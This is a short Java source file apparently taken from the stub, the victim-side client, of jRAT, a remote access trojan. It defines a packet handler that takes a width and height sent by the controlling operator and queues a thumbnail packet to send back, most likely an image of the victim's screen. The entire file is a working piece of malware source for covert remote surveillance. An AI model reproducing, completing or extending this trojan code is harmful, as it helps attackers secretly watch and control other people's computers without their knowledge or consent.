package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.packets.outgoing.Packet33Thumbnail;

public class Packet40Thumbnail extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		int width = con.readInt();
		int height = con.readInt();
		
		con.addToSendQueue(new Packet33Thumbnail(width, height));
	}

}
